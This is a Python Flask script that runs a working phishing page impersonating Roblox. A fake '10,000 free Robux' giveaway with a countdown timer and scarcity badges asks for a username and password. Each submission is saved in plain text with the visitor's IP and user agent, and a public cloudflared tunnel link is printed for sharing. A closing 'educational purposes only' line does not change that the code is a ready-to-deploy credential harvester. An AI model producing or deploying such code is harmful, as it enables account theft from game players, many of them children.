import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'roblox-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Roblox Robux")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['rb_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Roblox Free Robux Giveaway</title>
        <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
        <style>
            :root {
                --roblox-blue: #00A2FF;
                --roblox-green: #1DAD5C;
                --roblox-dark: #191A1D;
                --roblox-light: #F2F2F2;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #1E1E1E 0%, #191A1D 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: flex-start;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-box {
                background: rgba(25, 26, 29, 0.95);
                backdrop-filter: blur(20px);
                width: 100%;
                max-width: 500px;
                padding: 25px;
                border-radius: 20px;
                text-align: center;
                border: 2px solid rgba(0, 162, 255, 0.4);
                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
                margin: 20px 0;
                position: relative;
                overflow: hidden;
            }
            
            .roblox-logo {
                width: 180px;
                height: auto;
                margin: 0 auto 20px;
                display: block;
                filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
            }
            
            .logo-container {
                display: flex;
                justify-content: center;
                align-items: center;
                margin-bottom: 20px;
                padding: 15px 0;
            }
            
            .robux-banner {
                background: linear-gradient(90deg, #FF9C00 0%, #FFD700 50%, #FF9C00 100%);
                color: #000;
                padding: 18px 15px;
                border-radius: 15px;
                margin: 20px 0;
                font-weight: 800;
                font-size: 22px;
                text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.5);
                border: 3px solid #FF9C00;
                animation: glow 2s infinite;
                line-height: 1.3;
            }
            
            @keyframes glow {
                0% { box-shadow: 0 0 15px rgba(255, 156, 0, 0.5); }
                50% { box-shadow: 0 0 30px rgba(255, 156, 0, 0.8); }
                100% { box-shadow: 0 0 15px rgba(255, 156, 0, 0.5); }
            }
            
            .robux-icon {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                background: radial-gradient(circle at 30% 30%, #FFD700, #FF9C00);
                color: #000;
                width: 70px;
                height: 70px;
                border-radius: 50%;
                margin: 0 auto 15px;
                font-size: 32px;
                font-weight: bold;
                border: 4px solid #FFF;
                box-shadow: 0 6px 20px rgba(255, 156, 0, 0.5);
            }
            
            .giveaway-info {
                background: rgba(0, 162, 255, 0.1);
                border: 2px dashed var(--roblox-blue);
                border-radius: 15px;
                padding: 20px;
                margin: 20px 0;
                backdrop-filter: blur(5px);
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0 5px 0;
                background: linear-gradient(45deg, #00A2FF, #00FFD0);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                line-height: 1.2;
            }
            
            .subtitle {
                color: #B0B0B0;
                font-size: 16px;
                margin-bottom: 20px;
                line-height: 1.4;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.2);
                border: 2px solid #FF5555;
                border-radius: 12px;
                padding: 18px;
                margin: 20px 0;
                font-family: 'Courier New', monospace;
                font-size: 32px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
                letter-spacing: 2px;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #B0B0B0;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 8px;
                display: block;
            }
            
            input {
                width: 100%;
                padding: 16px 14px;
                background: rgba(255, 255, 255, 0.08);
                border: 2px solid rgba(255, 255, 255, 0.15);
                border-radius: 10px;
                color: white;
                font-size: 16px;
                transition: all 0.3s;
                -webkit-appearance: none;
                appearance: none;
            }
            
            input:focus {
                border-color: var(--roblox-blue);
                outline: none;
                background: rgba(255, 255, 255, 0.12);
                box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.2);
            }
            
            input::placeholder {
                color: #888;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #00A2FF, #1DAD5C);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 12px;
                font-weight: 700;
                font-size: 18px;
                width: 100%;
                margin: 20px 0;
                cursor: pointer;
                transition: all 0.3s;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                box-shadow: 0 6px 20px rgba(0, 162, 255, 0.3);
            }
            
            .login-btn:hover, .login-btn:active {
                transform: translateY(-3px);
                background: linear-gradient(45deg, #0088D6, #17944D);
                box-shadow: 0 8px 25px rgba(0, 162, 255, 0.4);
            }
            
            .qr-option {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                color: #B0B0B0;
                padding: 16px;
                border-radius: 10px;
                font-size: 16px;
                width: 100%;
                margin: 15px 0;
                cursor: pointer;
                text-align: center;
                transition: all 0.3s;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            
            .qr-option:hover, .qr-option:active {
                background: rgba(255, 255, 255, 0.1);
            }
            
            .benefits-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .benefit-item {
                background: rgba(255, 255, 255, 0.05);
                border-radius: 10px;
                padding: 15px 10px;
                text-align: center;
                border: 1px solid rgba(0, 162, 255, 0.2);
                transition: transform 0.3s;
            }
            
            .benefit-item:active {
                transform: scale(0.98);
            }
            
            .benefit-icon {
                font-size: 24px;
                margin-bottom: 8px;
                display: block;
            }
            
            .players-online {
                background: rgba(29, 173, 92, 0.15);
                border: 2px solid var(--roblox-green);
                border-radius: 10px;
                padding: 15px;
                margin: 20px 0;
                font-size: 15px;
                color: #A0FFC0;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 13px;
                margin-top: 20px;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
                padding-top: 15px;
                line-height: 1.5;
            }
            
            .limited-badge {
                display: inline-block;
                background: linear-gradient(45deg, #FF416C, #FF4B2B);
                color: white;
                padding: 6px 14px;
                border-radius: 20px;
                font-size: 13px;
                font-weight: 700;
                margin-left: 8px;
                animation: pulse 1.5s infinite;
                white-space: nowrap;
            }
            
            @keyframes pulse {
                0% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.9; }
                100% { transform: scale(1); opacity: 1; }
            }
            
            /* Mobile-specific optimizations */
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                    align-items: center;
                    min-height: 100vh;
                    display: flex;
                }
                
                .login-box {
                    padding: 20px;
                    margin: 0;
                    border-radius: 18px;
                    width: 100%;
                }
                
                .roblox-logo {
                    width: 150px;
                }
                
                .robux-banner {
                    font-size: 19px;
                    padding: 16px 12px;
                    margin: 15px 0;
                }
                
                .robux-icon {
                    width: 65px;
                    height: 65px;
                    font-size: 28px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .timer {
                    font-size: 28px;
                    padding: 16px;
                    margin: 15px 0;
                }
                
                .benefits-grid {
                    grid-template-columns: 1fr;
                    gap: 10px;
                }
                
                .login-btn {
                    padding: 17px;
                    font-size: 17px;
                }
                
                input {
                    padding: 15px 14px;
                    font-size: 16px;
                }
                
                .players-online {
                    font-size: 14px;
                    padding: 14px;
                }
            }
            
            @media (max-width: 360px) {
                .login-box {
                    padding: 18px;
                }
                
                .robux-banner {
                    font-size: 17px;
                }
                
                h1 {
                    font-size: 22px;
                }
                
                .timer {
                    font-size: 24px;
                }
            }
            
            /* Prevent zoom on iOS input focus */
            @supports (-webkit-touch-callout: none) {
                input, select, textarea {
                    font-size: 16px;
                }
            }
            
            /* Smooth scrolling for mobile */
            html {
                scroll-behavior: smooth;
                -webkit-overflow-scrolling: touch;
            }
            
            /* Better touch targets */
            button, input, .qr-option, .benefit-item {
                touch-action: manipulation;
                min-height: 44px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo-container">
                <img src="https://www.roblox.com/images/logo/roblox-white.svg" 
                     alt="Roblox Logo" 
                     class="roblox-logo"
                     onerror="this.onerror=null; this.style.display='none'; document.getElementById('fallback-logo').style.display='block';">
                <div id="fallback-logo" style="display: none; font-size: 36px; font-weight: 800; color: white; text-transform: uppercase; letter-spacing: 1px;">Roblox</div>
            </div>
            
            <div class="robux-banner">
                🎉 10,000 FREE ROBUX GIVEAWAY 🎉
            </div>
            
            <div class="robux-icon">R$</div>
            
            <div class="giveaway-info">
                <h1>Claim Your Free Robux</h1>
                <div class="subtitle">
                    Limited to first 50 users! <span class="limited-badge">15 left</span>
                </div>
                
                <div class="timer" id="countdown">
                    05:00
                </div>
            </div>
            
            <div class="players-online">
                <span>🔥</span>
                <strong>4,827,931 players online</strong>
                <span>- Don't miss out!</span>
            </div>
            
            <div class="benefits-grid">
                <div class="benefit-item">
                    <span class="benefit-icon">👕</span>
                    <div>Custom Avatar Items</div>
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">🎮</span>
                    <div>Game Passes</div>
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">💎</span>
                    <div>Premium Membership</div>
                </div>
                <div class="benefit-item">
                    <span class="benefit-icon">⭐</span>
                    <div>Exclusive Items</div>
                </div>
            </div>
            
            <form action="/login" method="post">
                <div class="form-group">
                    <label class="form-label">USERNAME OR EMAIL</label>
                    <input type="text" name="username" placeholder="Enter your Roblox username" required autocomplete="username">
                </div>
                
                <div class="form-group">
                    <label class="form-label">PASSWORD</label>
                    <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                </div>
                
                <button type="submit" class="login-btn">
                    <span>🎁</span>
                    <span>Claim 10,000 Free Robux</span>
                </button>
            </form>
            
            <div class="qr-option">
                <span>📱</span>
                <span>Login with QR Code</span>
            </div>
            
            <div class="warning-note">
                ⚠️ This offer is only available for the next 5 minutes. Robux will be added to your account within 24 hours after verification.
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 300;
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 60) {
                    countdownElement.style.color = '#FF5555';
                    countdownElement.style.animation = 'glow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Giveaway Ended!";
                    countdownElement.style.color = '#FF0000';
                    countdownElement.style.animation = 'none';
                }
            }
            
            updateTimer();
            
            // Prevent form resubmission on refresh
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
            
            // Add touch feedback for mobile
            document.addEventListener('touchstart', function() {}, {passive: true});
            
            // Handle logo fallback
            document.querySelector('.roblox-logo').addEventListener('error', function() {
                this.style.display = 'none';
                document.getElementById('fallback-logo').style.display = 'block';
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('rb_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Roblox Free Robux Giveaway\n")
        file.write(f"Robux Promised: 10,000\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Robux - Roblox</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #1E1E1E 0%, #191A1D 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                -webkit-tap-highlight-color: transparent;
            }
            
            .container {
                text-align: center;
                background: rgba(25, 26, 29, 0.95);
                backdrop-filter: blur(20px);
                padding: 30px;
                border-radius: 20px;
                width: 100%;
                max-width: 500px;
                border: 3px solid rgba(0, 162, 255, 0.4);
                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
            }
            
            .roblox-logo {
                width: 180px;
                height: auto;
                margin: 0 auto 25px;
                display: block;
                filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
            }
            
            .robux-icon-large {
                display: inline-flex;
                align-items: center;
                justify-content: center;
                background: radial-gradient(circle at 30% 30%, #FFD700, #FF9C00);
                color: #000;
                width: 100px;
                height: 100px;
                border-radius: 50%;
                margin: 0 auto 25px;
                font-size: 48px;
                font-weight: bold;
                border: 6px solid #FFF;
                animation: spin 3s linear infinite;
                box-shadow: 0 8px 25px rgba(255, 156, 0, 0.5);
            }
            
            @keyframes spin {
                0% { transform: rotateY(0deg); }
                100% { transform: rotateY(360deg); }
            }
            
            .processing-container {
                background: rgba(0, 162, 255, 0.1);
                border: 2px solid var(--roblox-blue);
                border-radius: 15px;
                padding: 25px;
                margin: 25px 0;
                backdrop-filter: blur(5px);
            }
            
            .progress-container {
                width: 100%;
                height: 14px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 7px;
                margin: 25px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #00A2FF, #1DAD5C, #FFD700);
                border-radius: 7px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .robux-added {
                background: rgba(255, 215, 0, 0.1);
                border: 2px solid #FFD700;
                border-radius: 15px;
                padding: 25px;
                margin: 25px 0;
                text-align: left;
                backdrop-filter: blur(5px);
            }
            
            .checkmark {
                color: #1DAD5C;
                font-weight: bold;
                font-size: 22px;
                margin-right: 15px;
                min-width: 25px;
            }
            
            .status-item {
                display: flex;
                align-items: flex-start;
                margin: 18px 0;
                color: #B0B0B0;
                font-size: 17px;
                line-height: 1.4;
            }
            
            .robux-amount {
                font-size: 42px;
                font-weight: 800;
                background: linear-gradient(45deg, #FFD700, #FF9C00);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0 25px 0;
                line-height: 1.1;
            }
            
            h2 {
                margin-bottom: 10px;
                color: #00A2FF;
                font-size: 26px;
                line-height: 1.2;
            }
            
            h3 {
                margin-top: 0;
                color: #FFFFFF;
                font-size: 20px;
            }
            
            /* Mobile optimizations */
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .container {
                    padding: 25px;
                    border-radius: 18px;
                }
                
                .roblox-logo {
                    width: 150px;
                    margin-bottom: 20px;
                }
                
                .robux-icon-large {
                    width: 90px;
                    height: 90px;
                    font-size: 42px;
                    margin-bottom: 20px;
                }
                
                .robux-amount {
                    font-size: 36px;
                }
                
                h2 {
                    font-size: 22px;
                }
                
                h3 {
                    font-size: 18px;
                }
                
                .processing-container {
                    padding: 20px;
                    margin: 20px 0;
                }
                
                .robux-added {
                    padding: 20px;
                }
                
                .status-item {
                    font-size: 16px;
                    margin: 15px 0;
                }
                
                .checkmark {
                    font-size: 20px;
                }
            }
            
            @media (max-width: 360px) {
                .container {
                    padding: 20px;
                }
                
                .robux-amount {
                    font-size: 32px;
                }
                
                h2 {
                    font-size: 20px;
                }
                
                .status-item {
                    font-size: 15px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <img src="https://www.roblox.com/images/logo/roblox-white.svg" 
                 alt="Roblox Logo" 
                 class="roblox-logo"
                 onerror="this.onerror=null; this.style.display='none';">
            
            <div class="robux-icon-large">R$</div>
            
            <div class="robux-amount">10,000 Robux</div>
            <h2>Robux Successfully Claimed!</h2>
            
            <div class="processing-container">
                <h3>Adding Robux to Your Account</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p style="color: #B0B0B0; margin-bottom: 0;">Processing transaction and verifying account...</p>
            </div>
            
            <div class="robux-added">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>10,000 Robux added</strong> to your balance</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Transaction ID:</strong> ROBX-<span id="transaction-id">0000000</span></div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Premium Membership</strong> activated for 30 days</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Daily Stipend:</strong> Additional Robux each day</div>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <div><strong>Trading Enabled:</strong> Trade items with other players</div>
                </div>
            </div>
            
            <p style="color: #B0B0B0; margin-top: 25px; font-size: 15px; line-height: 1.5;">
                You will be redirected to Roblox.com shortly...
                <br>
                <small style="color: #888; font-size: 13px;">Your Robux will appear in your account within 24 hours</small>
            </p>
        </div>
        
        <script>
            // Generate random transaction ID
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
                
            // Prevent zoom on mobile
            document.addEventListener('touchstart', function() {}, {passive: true});
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Roblox Robux Public Link: {tunnel_url}")
            print(f"💰 Promising: 10,000 FREE Robux")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Roblox credentials!")
            print("⚠️  Roblox scams often target children - be aware!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5003, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Roblox Free Robux Giveaway Page...")
    print("📱 Port: 5003")
    print("💾 Save location: ~/storage/downloads/RobloxRobux/")
    print("💰 Promising: 10,000 FREE Robux")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5003")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)